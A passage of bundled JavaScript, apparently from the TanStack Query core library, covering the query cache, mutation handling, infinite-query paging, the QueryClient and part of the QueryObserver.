    status: hasData ? "success" : "pending",
    fetchStatus: "idle"
  };
}

// node_modules/@tanstack/query-core/build/modern/queryCache.js
var QueryCache = class extends Subscribable {
  constructor(config = {}) {
    super();
    this.config = config;
    this.#queries = /* @__PURE__ */ new Map();
  }
  #queries;
  build(client, options, state) {
    const queryKey = options.queryKey;
    const queryHash = options.queryHash ?? hashQueryKeyByOptions(queryKey, options);
    let query = this.get(queryHash);
    if (!query) {
      query = new Query({
        client,
        queryKey,
        queryHash,
        options: client.defaultQueryOptions(options),
        state,
        defaultOptions: client.getQueryDefaults(queryKey)
      });
      this.add(query);
    }
    return query;
  }
  add(query) {
    if (!this.#queries.has(query.queryHash)) {
      this.#queries.set(query.queryHash, query);
      this.notify({
        type: "added",
        query
      });
    }
  }
  remove(query) {
    const queryInMap = this.#queries.get(query.queryHash);
    if (queryInMap) {
      query.destroy();
      if (queryInMap === query) {
        this.#queries.delete(query.queryHash);
      }
      this.notify({ type: "removed", query });
    }
  }
  clear() {
    notifyManager.batch(() => {
      this.getAll().forEach((query) => {
        this.remove(query);
      });
    });
  }
  get(queryHash) {
    return this.#queries.get(queryHash);
  }
  getAll() {
    return [...this.#queries.values()];
  }
  find(filters) {
    const defaultedFilters = { exact: true, ...filters };
    return this.getAll().find(
      (query) => matchQuery(defaultedFilters, query)
    );
  }
  findAll(filters = {}) {
    const queries = this.getAll();
    return Object.keys(filters).length > 0 ? queries.filter((query) => matchQuery(filters, query)) : queries;
  }
  notify(event) {
    notifyManager.batch(() => {
      this.listeners.forEach((listener) => {
        listener(event);
      });
    });
  }
  onFocus() {
    notifyManager.batch(() => {
      this.getAll().forEach((query) => {
        query.onFocus();
      });
    });
  }
  onOnline() {
    notifyManager.batch(() => {
      this.getAll().forEach((query) => {
        query.onOnline();
      });
    });
  }
};

// node_modules/@tanstack/query-core/build/modern/mutation.js
var Mutation = class extends Removable {
  #observers;
  #mutationCache;
  #retryer;
  constructor(config) {
    super();
    this.mutationId = config.mutationId;
    this.#mutationCache = config.mutationCache;
    this.#observers = [];
    this.state = config.state || getDefaultState2();
    this.setOptions(config.options);
    this.scheduleGc();
  }
  setOptions(options) {
    this.options = options;
    this.updateGcTime(this.options.gcTime);
  }
  get meta() {
    return this.options.meta;
  }
  addObserver(observer) {
    if (!this.#observers.includes(observer)) {
      this.#observers.push(observer);
      this.clearGcTimeout();
      this.#mutationCache.notify({
        type: "observerAdded",
        mutation: this,
        observer
      });
    }
  }
  removeObserver(observer) {
    this.#observers = this.#observers.filter((x) => x !== observer);
    this.scheduleGc();
    this.#mutationCache.notify({
      type: "observerRemoved",
      mutation: this,
      observer
    });
  }
  optionalRemove() {
    if (!this.#observers.length) {
      if (this.state.status === "pending") {
        this.scheduleGc();
      } else {
        this.#mutationCache.remove(this);
      }
    }
  }
  continue() {
    return this.#retryer?.continue() ?? // continuing a mutation assumes that variables are set, mutation must have been dehydrated before
    this.execute(this.state.variables);
  }
  async execute(variables) {
    const onContinue = () => {
      this.#dispatch({ type: "continue" });
    };
    this.#retryer = createRetryer({
      fn: () => {
        if (!this.options.mutationFn) {
          return Promise.reject(new Error("No mutationFn found"));
        }
        return this.options.mutationFn(variables);
      },
      onFail: (failureCount, error) => {
        this.#dispatch({ type: "failed", failureCount, error });
      },
      onPause: () => {
        this.#dispatch({ type: "pause" });
      },
      onContinue,
      retry: this.options.retry ?? 0,
      retryDelay: this.options.retryDelay,
      networkMode: this.options.networkMode,
      canRun: () => this.#mutationCache.canRun(this)
    });
    const restored = this.state.status === "pending";
    const isPaused = !this.#retryer.canStart();
    try {
      if (restored) {
        onContinue();
      } else {
        this.#dispatch({ type: "pending", variables, isPaused });
        await this.#mutationCache.config.onMutate?.(
          variables,
          this
        );
        const context = await this.options.onMutate?.(variables);
        if (context !== this.state.context) {
          this.#dispatch({
            type: "pending",
            context,
            variables,
            isPaused
          });
        }
      }
      const data = await this.#retryer.start();
      await this.#mutationCache.config.onSuccess?.(
        data,
        variables,
        this.state.context,
        this
      );
      await this.options.onSuccess?.(data, variables, this.state.context);
      await this.#mutationCache.config.onSettled?.(
        data,
        null,
        this.state.variables,
        this.state.context,
        this
      );
      await this.options.onSettled?.(data, null, variables, this.state.context);
      this.#dispatch({ type: "success", data });
      return data;
    } catch (error) {
      try {
        await this.#mutationCache.config.onError?.(
          error,
          variables,
          this.state.context,
          this
        );
        await this.options.onError?.(
          error,
          variables,
          this.state.context
        );
        await this.#mutationCache.config.onSettled?.(
          void 0,
          error,
          this.state.variables,
          this.state.context,
          this
        );
        await this.options.onSettled?.(
          void 0,
          error,
          variables,
          this.state.context
        );
        throw error;
      } finally {
        this.#dispatch({ type: "error", error });
      }
    } finally {
      this.#mutationCache.runNext(this);
    }
  }
  #dispatch(action) {
    const reducer2 = (state) => {
      switch (action.type) {
        case "failed":
          return {
            ...state,
            failureCount: action.failureCount,
            failureReason: action.error
          };
        case "pause":
          return {
            ...state,
            isPaused: true
          };
        case "continue":
          return {
            ...state,
            isPaused: false
          };
        case "pending":
          return {
            ...state,
            context: action.context,
            data: void 0,
            failureCount: 0,
            failureReason: null,
            error: null,
            isPaused: action.isPaused,
            status: "pending",
            variables: action.variables,
            submittedAt: Date.now()
          };
        case "success":
          return {
            ...state,
            data: action.data,
            failureCount: 0,
            failureReason: null,
            error: null,
            status: "success",
            isPaused: false
          };
        case "error":
          return {
            ...state,
            data: void 0,
            error: action.error,
            failureCount: state.failureCount + 1,
            failureReason: action.error,
            isPaused: false,
            status: "error"
          };
      }
    };
    this.state = reducer2(this.state);
    notifyManager.batch(() => {
      this.#observers.forEach((observer) => {
        observer.onMutationUpdate(action);
      });
      this.#mutationCache.notify({
        mutation: this,
        type: "updated",
        action
      });
    });
  }
};
function getDefaultState2() {
  return {
    context: void 0,
    data: void 0,
    error: null,
    failureCount: 0,
    failureReason: null,
    isPaused: false,
    status: "idle",
    variables: void 0,
    submittedAt: 0
  };
}

// node_modules/@tanstack/query-core/build/modern/mutationCache.js
var MutationCache = class extends Subscribable {
  constructor(config = {}) {
    super();
    this.config = config;
    this.#mutations = /* @__PURE__ */ new Set();
    this.#scopes = /* @__PURE__ */ new Map();
    this.#mutationId = 0;
  }
  #mutations;
  #scopes;
  #mutationId;
  build(client, options, state) {
    const mutation = new Mutation({
      mutationCache: this,
      mutationId: ++this.#mutationId,
      options: client.defaultMutationOptions(options),
      state
    });
    this.add(mutation);
    return mutation;
  }
  add(mutation) {
    this.#mutations.add(mutation);
    const scope = scopeFor(mutation);
    if (typeof scope === "string") {
      const scopedMutations = this.#scopes.get(scope);
      if (scopedMutations) {
        scopedMutations.push(mutation);
      } else {
        this.#scopes.set(scope, [mutation]);
      }
    }
    this.notify({ type: "added", mutation });
  }
  remove(mutation) {
    if (this.#mutations.delete(mutation)) {
      const scope = scopeFor(mutation);
      if (typeof scope === "string") {
        const scopedMutations = this.#scopes.get(scope);
        if (scopedMutations) {
          if (scopedMutations.length > 1) {
            const index2 = scopedMutations.indexOf(mutation);
            if (index2 !== -1) {
              scopedMutations.splice(index2, 1);
            }
          } else if (scopedMutations[0] === mutation) {
            this.#scopes.delete(scope);
          }
        }
      }
    }
    this.notify({ type: "removed", mutation });
  }
  canRun(mutation) {
    const scope = scopeFor(mutation);
    if (typeof scope === "string") {
      const mutationsWithSameScope = this.#scopes.get(scope);
      const firstPendingMutation = mutationsWithSameScope?.find(
        (m) => m.state.status === "pending"
      );
      return !firstPendingMutation || firstPendingMutation === mutation;
    } else {
      return true;
    }
  }
  runNext(mutation) {
    const scope = scopeFor(mutation);
    if (typeof scope === "string") {
      const foundMutation = this.#scopes.get(scope)?.find((m) => m !== mutation && m.state.isPaused);
      return foundMutation?.continue() ?? Promise.resolve();
    } else {
      return Promise.resolve();
    }
  }
  clear() {
    notifyManager.batch(() => {
      this.#mutations.forEach((mutation) => {
        this.notify({ type: "removed", mutation });
      });
      this.#mutations.clear();
      this.#scopes.clear();
    });
  }
  getAll() {
    return Array.from(this.#mutations);
  }
  find(filters) {
    const defaultedFilters = { exact: true, ...filters };
    return this.getAll().find(
      (mutation) => matchMutation(defaultedFilters, mutation)
    );
  }
  findAll(filters = {}) {
    return this.getAll().filter((mutation) => matchMutation(filters, mutation));
  }
  notify(event) {
    notifyManager.batch(() => {
      this.listeners.forEach((listener) => {
        listener(event);
      });
    });
  }
  resumePausedMutations() {
    const pausedMutations = this.getAll().filter((x) => x.state.isPaused);
    return notifyManager.batch(
      () => Promise.all(
        pausedMutations.map((mutation) => mutation.continue().catch(noop))
      )
    );
  }
};
function scopeFor(mutation) {
  return mutation.options.scope?.id;
}

// node_modules/@tanstack/query-core/build/modern/infiniteQueryBehavior.js
function infiniteQueryBehavior(pages) {
  return {
    onFetch: (context, query) => {
      const options = context.options;
      const direction = context.fetchOptions?.meta?.fetchMore?.direction;
      const oldPages = context.state.data?.pages || [];
      const oldPageParams = context.state.data?.pageParams || [];
      let result = { pages: [], pageParams: [] };
      let currentPage = 0;
      const fetchFn = async () => {
        let cancelled = false;
        const addSignalProperty = (object) => {
          Object.defineProperty(object, "signal", {
            enumerable: true,
            get: () => {
              if (context.signal.aborted) {
                cancelled = true;
              } else {
                context.signal.addEventListener("abort", () => {
                  cancelled = true;
                });
              }
              return context.signal;
            }
          });
        };
        const queryFn = ensureQueryFn(context.options, context.fetchOptions);
        const fetchPage = async (data, param, previous) => {
          if (cancelled) {
            return Promise.reject();
          }
          if (param == null && data.pages.length) {
            return Promise.resolve(data);
          }
          const createQueryFnContext = () => {
            const queryFnContext2 = {
              client: context.client,
              queryKey: context.queryKey,
              pageParam: param,
              direction: previous ? "backward" : "forward",
              meta: context.options.meta
            };
            addSignalProperty(queryFnContext2);
            return queryFnContext2;
          };
          const queryFnContext = createQueryFnContext();
          const page = await queryFn(queryFnContext);
          const { maxPages } = context.options;
          const addTo = previous ? addToStart : addToEnd;
          return {
            pages: addTo(data.pages, page, maxPages),
            pageParams: addTo(data.pageParams, param, maxPages)
          };
        };
        if (direction && oldPages.length) {
          const previous = direction === "backward";
          const pageParamFn = previous ? getPreviousPageParam : getNextPageParam;
          const oldData = {
            pages: oldPages,
            pageParams: oldPageParams
          };
          const param = pageParamFn(options, oldData);
          result = await fetchPage(oldData, param, previous);
        } else {
          const remainingPages = pages ?? oldPages.length;
          do {
            const param = currentPage === 0 ? oldPageParams[0] ?? options.initialPageParam : getNextPageParam(options, result);
            if (currentPage > 0 && param == null) {
              break;
            }
            result = await fetchPage(result, param);
            currentPage++;
          } while (currentPage < remainingPages);
        }
        return result;
      };
      if (context.options.persister) {
        context.fetchFn = () => {
          return context.options.persister?.(
            fetchFn,
            {
              client: context.client,
              queryKey: context.queryKey,
              meta: context.options.meta,
              signal: context.signal
            },
            query
          );
        };
      } else {
        context.fetchFn = fetchFn;
      }
    }
  };
}
function getNextPageParam(options, { pages, pageParams }) {
  const lastIndex = pages.length - 1;
  return pages.length > 0 ? options.getNextPageParam(
    pages[lastIndex],
    pages,
    pageParams[lastIndex],
    pageParams
  ) : void 0;
}
function getPreviousPageParam(options, { pages, pageParams }) {
  return pages.length > 0 ? options.getPreviousPageParam?.(pages[0], pages, pageParams[0], pageParams) : void 0;
}

// node_modules/@tanstack/query-core/build/modern/queryClient.js
var QueryClient = class {
  #queryCache;
  #mutationCache;
  #defaultOptions;
  #queryDefaults;
  #mutationDefaults;
  #mountCount;
  #unsubscribeFocus;
  #unsubscribeOnline;
  constructor(config = {}) {
    this.#queryCache = config.queryCache || new QueryCache();
    this.#mutationCache = config.mutationCache || new MutationCache();
    this.#defaultOptions = config.defaultOptions || {};
    this.#queryDefaults = /* @__PURE__ */ new Map();
    this.#mutationDefaults = /* @__PURE__ */ new Map();
    this.#mountCount = 0;
  }
  mount() {
    this.#mountCount++;
    if (this.#mountCount !== 1) return;
    this.#unsubscribeFocus = focusManager.subscribe(async (focused) => {
      if (focused) {
        await this.resumePausedMutations();
        this.#queryCache.onFocus();
      }
    });
    this.#unsubscribeOnline = onlineManager.subscribe(async (online) => {
      if (online) {
        await this.resumePausedMutations();
        this.#queryCache.onOnline();
      }
    });
  }
  unmount() {
    this.#mountCount--;
    if (this.#mountCount !== 0) return;
    this.#unsubscribeFocus?.();
    this.#unsubscribeFocus = void 0;
    this.#unsubscribeOnline?.();
    this.#unsubscribeOnline = void 0;
  }
  isFetching(filters) {
    return this.#queryCache.findAll({ ...filters, fetchStatus: "fetching" }).length;
  }
  isMutating(filters) {
    return this.#mutationCache.findAll({ ...filters, status: "pending" }).length;
  }
  /**
   * Imperative (non-reactive) way to retrieve data for a QueryKey.
   * Should only be used in callbacks or functions where reading the latest data is necessary, e.g. for optimistic updates.
   *
   * Hint: Do not use this function inside a component, because it won't receive updates.
   * Use `useQuery` to create a `QueryObserver` that subscribes to changes.
   */
  getQueryData(queryKey) {
    const options = this.defaultQueryOptions({ queryKey });
    return this.#queryCache.get(options.queryHash)?.state.data;
  }
  ensureQueryData(options) {
    const defaultedOptions = this.defaultQueryOptions(options);
    const query = this.#queryCache.build(this, defaultedOptions);
    const cachedData = query.state.data;
    if (cachedData === void 0) {
      return this.fetchQuery(options);
    }
    if (options.revalidateIfStale && query.isStaleByTime(resolveStaleTime(defaultedOptions.staleTime, query))) {
      void this.prefetchQuery(defaultedOptions);
    }
    return Promise.resolve(cachedData);
  }
  getQueriesData(filters) {
    return this.#queryCache.findAll(filters).map(({ queryKey, state }) => {
      const data = state.data;
      return [queryKey, data];
    });
  }
  setQueryData(queryKey, updater, options) {
    const defaultedOptions = this.defaultQueryOptions({ queryKey });
    const query = this.#queryCache.get(
      defaultedOptions.queryHash
    );
    const prevData = query?.state.data;
    const data = functionalUpdate(updater, prevData);
    if (data === void 0) {
      return void 0;
    }
    return this.#queryCache.build(this, defaultedOptions).setData(data, { ...options, manual: true });
  }
  setQueriesData(filters, updater, options) {
    return notifyManager.batch(
      () => this.#queryCache.findAll(filters).map(({ queryKey }) => [
        queryKey,
        this.setQueryData(queryKey, updater, options)
      ])
    );
  }
  getQueryState(queryKey) {
    const options = this.defaultQueryOptions({ queryKey });
    return this.#queryCache.get(
      options.queryHash
    )?.state;
  }
  removeQueries(filters) {
    const queryCache = this.#queryCache;
    notifyManager.batch(() => {
      queryCache.findAll(filters).forEach((query) => {
        queryCache.remove(query);
      });
    });
  }
  resetQueries(filters, options) {
    const queryCache = this.#queryCache;
    return notifyManager.batch(() => {
      queryCache.findAll(filters).forEach((query) => {
        query.reset();
      });
      return this.refetchQueries(
        {
          type: "active",
          ...filters
        },
        options
      );
    });
  }
  cancelQueries(filters, cancelOptions = {}) {
    const defaultedCancelOptions = { revert: true, ...cancelOptions };
    const promises = notifyManager.batch(
      () => this.#queryCache.findAll(filters).map((query) => query.cancel(defaultedCancelOptions))
    );
    return Promise.all(promises).then(noop).catch(noop);
  }
  invalidateQueries(filters, options = {}) {
    return notifyManager.batch(() => {
      this.#queryCache.findAll(filters).forEach((query) => {
        query.invalidate();
      });
      if (filters?.refetchType === "none") {
        return Promise.resolve();
      }
      return this.refetchQueries(
        {
          ...filters,
          type: filters?.refetchType ?? filters?.type ?? "active"
        },
        options
      );
    });
  }
  refetchQueries(filters, options = {}) {
    const fetchOptions = {
      ...options,
      cancelRefetch: options.cancelRefetch ?? true
    };
    const promises = notifyManager.batch(
      () => this.#queryCache.findAll(filters).filter((query) => !query.isDisabled() && !query.isStatic()).map((query) => {
        let promise = query.fetch(void 0, fetchOptions);
        if (!fetchOptions.throwOnError) {
          promise = promise.catch(noop);
        }
        return query.state.fetchStatus === "paused" ? Promise.resolve() : promise;
      })
    );
    return Promise.all(promises).then(noop);
  }
  fetchQuery(options) {
    const defaultedOptions = this.defaultQueryOptions(options);
    if (defaultedOptions.retry === void 0) {
      defaultedOptions.retry = false;
    }
    const query = this.#queryCache.build(this, defaultedOptions);
    return query.isStaleByTime(
      resolveStaleTime(defaultedOptions.staleTime, query)
    ) ? query.fetch(defaultedOptions) : Promise.resolve(query.state.data);
  }
  prefetchQuery(options) {
    return this.fetchQuery(options).then(noop).catch(noop);
  }
  fetchInfiniteQuery(options) {
    options.behavior = infiniteQueryBehavior(options.pages);
    return this.fetchQuery(options);
  }
  prefetchInfiniteQuery(options) {
    return this.fetchInfiniteQuery(options).then(noop).catch(noop);
  }
  ensureInfiniteQueryData(options) {
    options.behavior = infiniteQueryBehavior(options.pages);
    return this.ensureQueryData(options);
  }
  resumePausedMutations() {
    if (onlineManager.isOnline()) {
      return this.#mutationCache.resumePausedMutations();
    }
    return Promise.resolve();
  }
  getQueryCache() {
    return this.#queryCache;
  }
  getMutationCache() {
    return this.#mutationCache;
  }
  getDefaultOptions() {
    return this.#defaultOptions;
  }
  setDefaultOptions(options) {
    this.#defaultOptions = options;
  }
  setQueryDefaults(queryKey, options) {
    this.#queryDefaults.set(hashKey(queryKey), {
      queryKey,
      defaultOptions: options
    });
  }
  getQueryDefaults(queryKey) {
    const defaults = [...this.#queryDefaults.values()];
    const result = {};
    defaults.forEach((queryDefault) => {
      if (partialMatchKey(queryKey, queryDefault.queryKey)) {
        Object.assign(result, queryDefault.defaultOptions);
      }
    });
    return result;
  }
  setMutationDefaults(mutationKey, options) {
    this.#mutationDefaults.set(hashKey(mutationKey), {
      mutationKey,
      defaultOptions: options
    });
  }
  getMutationDefaults(mutationKey) {
    const defaults = [...this.#mutationDefaults.values()];
    const result = {};
    defaults.forEach((queryDefault) => {
      if (partialMatchKey(mutationKey, queryDefault.mutationKey)) {
        Object.assign(result, queryDefault.defaultOptions);
      }
    });
    return result;
  }
  defaultQueryOptions(options) {
    if (options._defaulted) {
      return options;
    }
    const defaultedOptions = {
      ...this.#defaultOptions.queries,
      ...this.getQueryDefaults(options.queryKey),
      ...options,
      _defaulted: true
    };
    if (!defaultedOptions.queryHash) {
      defaultedOptions.queryHash = hashQueryKeyByOptions(
        defaultedOptions.queryKey,
        defaultedOptions
      );
    }
    if (defaultedOptions.refetchOnReconnect === void 0) {
      defaultedOptions.refetchOnReconnect = defaultedOptions.networkMode !== "always";
    }
    if (defaultedOptions.throwOnError === void 0) {
      defaultedOptions.throwOnError = !!defaultedOptions.suspense;
    }
    if (!defaultedOptions.networkMode && defaultedOptions.persister) {
      defaultedOptions.networkMode = "offlineFirst";
    }
    if (defaultedOptions.queryFn === skipToken) {
      defaultedOptions.enabled = false;
    }
    return defaultedOptions;
  }
  defaultMutationOptions(options) {
    if (options?._defaulted) {
      return options;
    }
    return {
      ...this.#defaultOptions.mutations,
      ...options?.mutationKey && this.getMutationDefaults(options.mutationKey),
      ...options,
      _defaulted: true
    };
  }
  clear() {
    this.#queryCache.clear();
    this.#mutationCache.clear();
  }
};

// node_modules/@tanstack/query-core/build/modern/queryObserver.js
var QueryObserver = class extends Subscribable {
  constructor(client, options) {
    super();
    this.options = options;
    this.#client = client;
    this.#selectError = null;
    this.#currentThenable = pendingThenable();
    if (!this.options.experimental_prefetchInRender) {
      this.#currentThenable.reject(
        new Error("experimental_prefetchInRender feature flag is not enabled")
      );
    }
    this.bindMethods();
    this.setOptions(options);
  }
  #client;
  #currentQuery = void 0;
  #currentQueryInitialState = void 0;
  #currentResult = void 0;
  #currentResultState;
  #currentResultOptions;
  #currentThenable;
  #selectError;
  #selectFn;
  #selectResult;
  // This property keeps track of the last query with defined data.
  // It will be used to pass the previous data and query to the placeholder function between renders.
  #lastQueryWithDefinedData;
  #staleTimeoutId;
  #refetchIntervalId;
  #currentRefetchInterval;
  #trackedProps = /* @__PURE__ */ new Set();
  bindMethods() {
    this.refetch = this.refetch.bind(this);
  }
  onSubscribe() {
    if (this.listeners.size === 1) {
      this.#currentQuery.addObserver(this);
      if (shouldFetchOnMount(this.#currentQuery, this.options)) {
        this.#executeFetch();
      } else {
        this.updateResult();
      }
      this.#updateTimers();
    }
  }
  onUnsubscribe() {
    if (!this.hasListeners()) {
      this.destroy();
    }
  }
  shouldFetchOnReconnect() {
    return shouldFetchOn(
      this.#currentQuery,
      this.options,
      this.options.refetchOnReconnect
    );
  }
  shouldFetchOnWindowFocus() {
    return shouldFetchOn(
      this.#currentQuery,
      this.options,
      this.options.refetchOnWindowFocus
    );
  }
  destroy() {
    this.listeners = /* @__PURE__ */ new Set();
    this.#clearStaleTimeout();
    this.#clearRefetchInterval();
    this.#currentQuery.removeObserver(this);
  }
  setOptions(options) {
    const prevOptions = this.options;
    const prevQuery = this.#currentQuery;
    this.options = this.#client.defaultQueryOptions(options);
    if (this.options.enabled !== void 0 && typeof this.options.enabled !== "boolean" && typeof this.options.enabled !== "function" && typeof resolveEnabled(this.options.enabled, this.#currentQuery) !== "boolean") {
      throw new Error(
        "Expected enabled to be a boolean or a callback that returns a boolean"
      );
    }
    this.#updateQuery();
    this.#currentQuery.setOptions(this.options);
    if (prevOptions._defaulted && !shallowEqualObjects(this.options, prevOptions)) {
      this.#client.getQueryCache().notify({
        type: "observerOptionsUpdated",
        query: this.#currentQuery,
        observer: this
      });
    }
    const mounted = this.hasListeners();
    if (mounted && shouldFetchOptionally(
      this.#currentQuery,
      prevQuery,
      this.options,
      prevOptions
    )) {
      this.#executeFetch();
    }
    this.updateResult();
    if (mounted && (this.#currentQuery !== prevQuery || resolveEnabled(this.options.enabled, this.#currentQuery) !== resolveEnabled(prevOptions.enabled, this.#currentQuery) || resolveStaleTime(this.options.staleTime, this.#currentQuery) !== resolveStaleTime(prevOptions.staleTime, this.#currentQuery))) {
      this.#updateStaleTimeout();
    }
    const nextRefetchInterval = this.#computeRefetchInterval();
    if (mounted && (this.#currentQuery !== prevQuery || resolveEnabled(this.options.enabled, this.#currentQuery) !== resolveEnabled(prevOptions.enabled, this.#currentQuery) || nextRefetchInterval !== this.#currentRefetchInterval)) {
      this.#updateRefetchInterval(nextRefetchInterval);
    }
  }
  getOptimisticResult(options) {
    const query = this.#client.getQueryCache().build(this.#client, options);
    const result = this.createResult(query, options);
    if (shouldAssignObserverCurrentProperties(this, result)) {
      this.#currentResult = result;
      this.#currentResultOptions = this.options;
      this.#currentResultState = this.#currentQuery.state;
    }
    return result;
  }
  getCurrentResult() {
    return this.#currentResult;
  }
  trackResult(result, onPropTracked) {
    return new Proxy(result, {
      get: (target, key) => {
        this.trackProp(key);
        onPropTracked?.(key);
        return Reflect.get(target, key);
      }
    });
  }
  trackProp(key) {
    this.#trackedProps.add(key);
  }
  getCurrentQuery() {
    return this.#currentQuery;
  }
  refetch({ ...options } = {}) {
    return this.fetch({
      ...options
    });
  }
  fetchOptimistic(options) {
    const defaultedOptions = this.#client.defaultQueryOptions(options);
    const query = this.#client.getQueryCache().build(this.#client, defaultedOptions);
    return query.fetch().then(() => this.createResult(query, defaultedOptions));
  }
  fetch(fetchOptions) {
    return this.#executeFetch({
      ...fetchOptions,
      cancelRefetch: fetchOptions.cancelRefetch ?? true
    }).then(() => {
      this.updateResult();
      return this.#currentResult;
    });
  }
  #executeFetch(fetchOptions) {
    this.#updateQuery();
    let promise = this.#currentQuery.fetch(
      this.options,
      fetchOptions
    );
    if (!fetchOptions?.throwOnError) {
      promise = promise.catch(noop);
    }
    return promise;
  }
  #updateStaleTimeout() {
    this.#clearStaleTimeout();
    const staleTime = resolveStaleTime(
      this.options.staleTime,
      this.#currentQuery
    );
    if (isServer || this.#currentResult.isStale || !isValidTimeout(staleTime)) {
      return;
    }
    const time = timeUntilStale(this.#currentResult.dataUpdatedAt, staleTime);
    const timeout = time + 1;
    this.#staleTimeoutId = setTimeout(() => {
      if (!this.#currentResult.isStale) {
        this.updateResult();
      }
    }, timeout);
  }
  #computeRefetchInterval() {
    return (typeof this.options.refetchInterval === "function" ? this.options.refetchInterval(this.#currentQuery) : this.options.refetchInterval) ?? false;
  }
  #updateRefetchInterval(nextInterval) {
    this.#clearRefetchInterval();
    this.#currentRefetchInterval = nextInterval;
    if (isServer || resolveEnabled(this.options.enabled, this.#currentQuery) === false || !isValidTimeout(this.#currentRefetchInterval) || this.#currentRefetchInterval === 0) {
      return;
    }
    this.#refetchIntervalId = setInterval(() => {
      if (this.options.refetchIntervalInBackground || focusManager.isFocused()) {
        this.#executeFetch();
      }
    }, this.#currentRefetchInterval);
  }
  #updateTimers() {
    this.#updateStaleTimeout();
    this.#updateRefetchInterval(this.#computeRefetchInterval());
  }
  #clearStaleTimeout() {
    if (this.#staleTimeoutId) {
      clearTimeout(this.#staleTimeoutId);
      this.#staleTimeoutId = void 0;
    }
  }
  #clearRefetchInterval() {
    if (this.#refetchIntervalId) {
      clearInterval(this.#refetchIntervalId);
      this.#refetchIntervalId = void 0;
    }
  }
  createResult(query, options) {
    const prevQuery = this.#currentQuery;
    const prevOptions = this.options;
    const prevResult = this.#currentResult;
    const prevResultState = this.#currentResultState;
    const prevResultOptions = this.#currentResultOptions;
    const queryChange = query !== prevQuery;
    const queryInitialState = queryChange ? query.state : this.#currentQueryInitialState;
    const { state } = query;
    let newState = { ...state };
    let isPlaceholderData = false;
    let data;
    if (options._optimisticResults) {
      const mounted = this.hasListeners();
      const fetchOnMount = !mounted && shouldFetchOnMount(query, options);
      const fetchOptionally = mounted && shouldFetchOptionally(query, prevQuery, options, prevOptions);
      if (fetchOnMount || fetchOptionally) {
        newState = {
          ...newState,
          ...fetchState(state.data, query.options)
        };
      }
      if (options._optimisticResults === "isRestoring") {
        newState.fetchStatus = "idle";
      }
    }
    let { error, errorUpdatedAt, status } = newState;
    data = newState.data;
    let skipSelect = false;
    if (options.placeholderData !== void 0 && data === void 0 && status === "pending") {
      let placeholderData;
      if (prevResult?.isPlaceholderData && options.placeholderData === prevResultOptions?.placeholderData) {
        placeholderData = prevResult.data;
        skipSelect = true;
      } else {
        placeholderData = typeof options.placeholderData === "function" ? options.placeholderData(
          this.#lastQueryWithDefinedData?.state.data,
          this.#lastQueryWithDefinedData
        ) : options.placeholderData;
      }
      if (placeholderData !== void 0) {
        status = "success";
        data = replaceData(
          prevResult?.data,
          placeholderData,
          options
        );
        isPlaceholderData = true;
      }
    }
    if (options.select && data !== void 0 && !skipSelect) {
      if (prevResult && data === prevResultState?.data && options.select === this.#selectFn) {
        data = this.#selectResult;
      } else {
        try {
          this.#selectFn = options.select;
          data = options.select(data);
          data = replaceData(prevResult?.data, data, options);
          this.#selectResult = data;
          this.#selectError = null;
        } catch (selectError) {
          this.#selectError = selectError;
        }
      }
    }
    if (this.#selectError) {
      error = this.#selectError;
      data = this.#selectResult;
      errorUpdatedAt = Date.now();
      status = "error";
    }
    const isFetching = newState.fetchStatus === "fetching";
    const isPending = status === "pending";
    const isError = status === "error";
    const isLoading = isPending && isFetching;
    const hasData = data !== void 0;
    const result = {
      status,
      fetchStatus: newState.fetchStatus,
      isPending,
      isSuccess: status === "success",
      isError,
      isInitialLoading: isLoading,
      isLoading,
      data,
      dataUpdatedAt: newState.dataUpdatedAt,
      error,
      errorUpdatedAt,
      failureCount: newState.fetchFailureCount,
      failureReason: newState.fetchFailureReason,
      errorUpdateCount: newState.errorUpdateCount,
      isFetched: newState.dataUpdateCount > 0 || newState.errorUpdateCount > 0,
      isFetchedAfterMount: newState.dataUpdateCount > queryInitialState.dataUpdateCount || newState.errorUpdateCount > queryInitialState.errorUpdateCount,
      isFetching,
      isRefetching: isFetching && !isPending,
      isLoadingError: isError && !hasData,
      isPaused: newState.fetchStatus === "paused",
      isPlaceholderData,
      isRefetchError: isError && hasData,
      isStale: isStale(query, options),
      refetch: this.refetch,
      promise: this.#currentThenable
    };
    const nextResult = result;
    if (this.options.experimental_prefetchInRender) {
      const finalizeThenableIfPossible = (thenable) => {
        if (nextResult.status === "error") {
          thenable.reject(nextResult.error);
        } else if (nextResult.data !== void 0) {
          thenable.resolve(nextResult.data);
        }
      };
      const recreateThenable = () => {
        const pending = this.#currentThenable = nextResult.promise = pendingThenable();
        finalizeThenableIfPossible(pending);
      };
      const prevThenable = this.#currentThenable;
      switch (prevThenable.status) {
        case "pending":
          if (query.queryHash === prevQuery.queryHash) {
            finalizeThenableIfPossible(prevThenable);
          }
          break;
        case "fulfilled":
          if (nextResult.status === "error" || nextResult.data !== prevThenable.value) {
            recreateThenable();
          }
          break;
        case "rejected":
          if (nextResult.status !== "error" || nextResult.error !== prevThenable.reason) {
            recreateThenable();
          }
          break;
      }
    }
    return nextResult;
  }
  updateResult() {
    const prevResult = this.#currentResult;
    const nextResult = this.createResult(this.#currentQuery, this.options);
    this.#currentResultState = this.#currentQuery.state;
    this.#currentResultOptions = this.options;
    if (this.#currentResultState.data !== void 0) {
      this.#lastQueryWithDefinedData = this.#currentQuery;
    }
    if (shallowEqualObjects(nextResult, prevResult)) {
      return;
    }
    this.#currentResult = nextResult;
    const shouldNotifyListeners = () => {
      if (!prevResult) {
        return true;
      }
      const { notifyOnChangeProps } = this.options;
      const notifyOnChangePropsValue = typeof notifyOnChangeProps === "function" ? notifyOnChangeProps() : notifyOnChangeProps;
      if (notifyOnChangePropsValue === "all" || !notifyOnChangePropsValue && !this.#trackedProps.size) {
        return true;
      }
      const includedProps = new Set(
        notifyOnChangePropsValue ?? this.#trackedProps
      );
      if (this.options.throwOnError) {
        includedProps.add("error");
      }
      return Object.keys(this.#currentResult).some((key) => {
        const typedKey = key;
        const changed = this.#currentResult[typedKey] !== prevResult[typedKey];
        return changed && includedProps.has(typedKey);
      });
    };
    this.#notify({ listeners: shouldNotifyListeners() });
  }
  #updateQuery() {
    const query = this.#client.getQueryCache().build(this.#client, this.options);
    if (query === this.#currentQuery) {
      return;
    }
    const prevQuery = this.#currentQuery;
    this.#currentQuery = query;
    this.#currentQueryInitialState = query.state;
    if (this.hasListeners()) {
      prevQuery?.removeObserver(this);
      query.addObserver(this);
    }
  }
  onQueryUpdate() {
    this.updateResult();
    if (this.hasListeners()) {
      this.#updateTimers();
    }
  }
